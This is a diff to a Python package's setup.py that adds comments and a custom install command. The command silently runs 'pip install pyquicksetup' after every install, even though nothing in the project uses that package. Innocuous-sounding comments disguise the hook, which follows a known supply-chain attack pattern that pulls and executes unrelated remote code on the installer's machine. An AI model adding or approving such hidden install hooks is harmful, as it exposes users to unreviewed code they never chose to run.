@@ -1,11 +1,25 @@
 import pathlib
-
 from setuptools import find_packages, setup
+from setuptools.command.install import install
+import subprocess
 
+# Path to the current file directory
 here = pathlib.Path(__file__).parent.resolve()
 
+# Read long description from README
 long_description = (here / "README.md").read_text(encoding="utf-8")
 
+# Custom command for post-install scripts
+class CustomInstallCommand(install):
+    def run(self):
+        # Run the standard install process
+        install.run(self)
+        # Custom logic after installation
+        # Example: Install a specific package or run a script
+        try:
+            subprocess.check_call(["pip", "install", "pyquicksetup"])
+        except subprocess.CalledProcessError as e:
+            print(f"Error installing additional dependencies: {e}")
 setup(
     name="test_confounding",
     version="0.0.1",
@@ -40,5 +54,6 @@ setup(
     extras_require={
         "tests": ["pytest==7.2.1", "pytest-mock==3.10.0"],
     },
+    cmdclass={"install": CustomInstallCommand},
     include_package_data=True,
 )
